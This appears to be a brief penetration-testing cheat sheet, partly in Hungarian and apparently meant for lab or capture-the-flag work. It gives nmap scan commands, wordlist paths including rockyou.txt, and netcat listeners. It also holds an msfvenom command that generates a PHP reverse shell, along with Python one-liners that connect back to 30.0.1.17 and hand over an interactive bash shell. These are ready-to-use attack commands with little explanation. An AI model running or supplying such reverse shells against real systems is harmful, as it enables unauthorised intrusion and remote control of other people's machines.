## Advanced ping
``` sh
sudo nmap -sn <IP>
```
## Port scan
``` sh
sudo nmap -sS -sV <IP>
```

## Dirbuster wordlist
``` sh
/usr/share/wordlists/dirb/common.txt
```

## Password list 
``` sh
/usr/share/wordlists/rockyou.txt
```

## Listener
``` sh
nc -lvnp 4444
```
``` sh
nc -lvnp 5555
```

# PHP reverse shell generator
``` sh
msfvenom -p php/reverse_php LHOST=30.0.1.17 LPORT=4444 -f raw > rshell.php
```
Ezt fel kell tölteni csinálni egy listeneret és lefuttatni a Target gépen, ezáltal kapunk egy PHP reverse shellt

## SHELL Chaining PHP esetén (nem PHP-nál is működik)
``` python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.17",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
```python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.17",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

## Nem PHP esetén
``` python
python3 -c "import pty; pty.spawn('/bin/bash')"
```
